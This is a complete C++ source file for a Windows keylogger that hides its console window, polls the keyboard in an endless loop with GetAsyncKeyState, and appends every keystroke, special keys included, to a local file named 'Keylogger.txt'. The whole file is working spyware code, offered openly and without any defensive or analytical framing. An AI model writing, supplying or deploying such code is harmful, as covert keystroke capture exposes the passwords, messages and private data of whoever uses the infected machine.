#include <iostream>
#include <windows.h>
#include <fstream>
#include <bits/stdc++.h>

// path

#define log_FILe "Keylogger.txt"

///////////DATA INFO LOG File=======================
void saveData(std::string data)
{
    std::fstream logFile;

    logFile.open(log_FILe, std::ios::app);

    logFile << data;
    logFile.close();
}
std::string translateSpecialKey(int key)
{
    std::string result;
    switch (key)
    {
    case VK_SPACE:
        ///////back space
        result = " ";
        break;
    case VK_RETURN:
        //////NEw Line Key
        /// or  enter
        result = "\n";
        break;
    case VK_BACK:
        ///////backs [space]
        result = "\b";
        break;
    case VK_CAPITAL:
        ///[CAPSLOCKS] KEY
        result = "[CAPS_LOCKS]";
        break;
    case VK_SHIFT:
        // shift KEy
        result = "[shift]";
        break;
    case VK_TAB:
        // tab buttons
        result = " [tab]";
        break;
    case VK_CONTROL:
        /// control Key
        result = "[ctrl]";
        break;
    case VK_MENU:
        /// alt key ;;
        result = " [alt]";
        break;
    default:
        break;
    }

    return result;
}

int main()
{

    int specialkeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
    std::string specialkeychar;
    bool isspecialkey;

    ///////Hide Terminal ////////////////////////////////////////////////////////////
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd , SW_HIDE);

    ////LOOPS ForEVer ;
    while (true)
    {
        for (int key = 8; key <= 190; key++)
        {
            // check key is pressed
            if (GetAsyncKeyState(key) == -32767)
            {

                /// Key is pressed
                // check if key is special key
                isspecialkey = std::find(std::begin(specialkeyArray), std::end(specialkeyArray), key) != std::end(specialkeyArray);
                if (isspecialkey)
                {

                    ////this is special key . we need to translate it
                    specialkeychar = translateSpecialKey(key);
                    ///////// Save data
                    saveData(specialkeychar);
                }
                else
                {
                    // This is not a  special key . we need to check if it is uppercase or lowercase
                    if (GetKeyState(VK_CAPITAL))
                    {
                        ///////CAPTSLOCK is on
                        saveData(std::string(1, (char)key));
                    }
                    else
                    {
                        /// CAPSLOCKS is off
                        // turn the character into  lowwecase before save
                        saveData(std::string(1, (char)std::towlower(key)));
                    }
                }
            }
        }
    }

    return 0;
}
